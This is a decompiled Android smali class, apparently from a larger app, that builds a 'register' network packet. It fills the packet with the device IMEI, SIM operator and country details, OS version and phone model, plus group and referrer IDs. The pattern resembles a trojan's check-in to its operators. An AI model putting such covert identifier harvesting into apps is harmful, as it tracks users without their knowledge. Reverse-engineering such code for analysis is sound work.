.class public Lorg/verywell/kernel/packets/Register;
.super Lorg/verywell/kernel/net/Packet;
.source "Register.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lorg/verywell/kernel/packets/Register$Answer;
    }
.end annotation


# instance fields
.field public group_id:I

.field public imei:Ljava/lang/String;

.field public note:Ljava/lang/String;

.field public os:Ljava/lang/String;

.field public os_version:Ljava/lang/String;

.field public phone_model:Ljava/lang/String;

.field public reffer_id:I

.field public sim_country:Ljava/lang/String;

.field public sim_current_country:Ljava/lang/String;

.field public sim_current_operator:Ljava/lang/String;

.field public sim_operator:Ljava/lang/String;

.field public version:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 5

    .prologue
    const/4 v4, 0x0

    const/4 v3, 0x0

    .line 38
    invoke-direct {p0}, Lorg/verywell/kernel/net/Packet;-><init>()V

    .line 24
    iput-object v3, p0, Lorg/verywell/kernel/packets/Register;->imei:Ljava/lang/String;

    .line 25
    iput-object v3, p0, Lorg/verywell/kernel/packets/Register;->os:Ljava/lang/String;

    .line 26
    iput-object v3, p0, Lorg/verywell/kernel/packets/Register;->os_version:Ljava/lang/String;

    .line 27
    const-string v2, "blabla"

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->phone_model:Ljava/lang/String;

    .line 28
    iput-object v3, p0, Lorg/verywell/kernel/packets/Register;->sim_country:Ljava/lang/String;

    .line 29
    iput-object v3, p0, Lorg/verywell/kernel/packets/Register;->sim_operator:Ljava/lang/String;

    .line 30
    iput-object v3, p0, Lorg/verywell/kernel/packets/Register;->sim_current_country:Ljava/lang/String;

    .line 31
    iput-object v3, p0, Lorg/verywell/kernel/packets/Register;->sim_current_operator:Ljava/lang/String;

    .line 32
    iput v4, p0, Lorg/verywell/kernel/packets/Register;->group_id:I

    .line 33
    iput v4, p0, Lorg/verywell/kernel/packets/Register;->reffer_id:I

    .line 34
    const-string v2, ""

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->note:Ljava/lang/String;

    .line 35
    sget-object v2, Lorg/verywell/kernel/Consts;->version:Ljava/lang/String;

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->version:Ljava/lang/String;

    .line 39
    const-string v2, "register"

    invoke-virtual {p0, v2}, Lorg/verywell/kernel/packets/Register;->init(Ljava/lang/String;)V

    .line 40
    invoke-static {}, Lorg/verywell/kernel/RunService;->getService()Lorg/verywell/kernel/RunService;

    move-result-object v1

    .line 41
    .local v1, "s":Lorg/verywell/kernel/RunService;
    invoke-virtual {v1}, Lorg/verywell/kernel/RunService;->getAPI()Lorg/verywell/kernel/xAPI;

    move-result-object v0

    .line 42
    .local v0, "api":Lorg/verywell/kernel/xAPI;
    invoke-virtual {v0}, Lorg/verywell/kernel/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    aget-object v2, v2, v4

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->imei:Ljava/lang/String;

    .line 44
    const-string v2, "android"

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->os:Ljava/lang/String;

    .line 45
    invoke-virtual {v0}, Lorg/verywell/kernel/xAPI;->getAndroidVersion()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->os_version:Ljava/lang/String;

    .line 46
    invoke-virtual {v0}, Lorg/verywell/kernel/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x5

    aget-object v2, v2, v3

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->sim_country:Ljava/lang/String;

    .line 47
    invoke-virtual {v0}, Lorg/verywell/kernel/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x4

    aget-object v2, v2, v3

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->sim_operator:Ljava/lang/String;

    .line 48
    invoke-virtual {v0}, Lorg/verywell/kernel/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x3

    aget-object v2, v2, v3

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->sim_current_country:Ljava/lang/String;

    .line 49
    invoke-virtual {v0}, Lorg/verywell/kernel/xAPI;->getTelephonyInfo()[Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x2

    aget-object v2, v2, v3

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->sim_current_operator:Ljava/lang/String;

    .line 50
    sget v2, Lorg/verywell/kernel/Consts;->groupName:I

    iput v2, p0, Lorg/verywell/kernel/packets/Register;->group_id:I

    .line 51
    sget v2, Lorg/verywell/kernel/Consts;->trafferName:I

    iput v2, p0, Lorg/verywell/kernel/packets/Register;->reffer_id:I

    .line 52
    invoke-static {}, Lorg/verywell/kernel/utilities/DeviceName;->getDeviceName()Ljava/lang/String;

    move-result-object v2

    iput-object v2, p0, Lorg/verywell/kernel/packets/Register;->phone_model:Ljava/lang/String;

    .line 53
    return-void
.end method
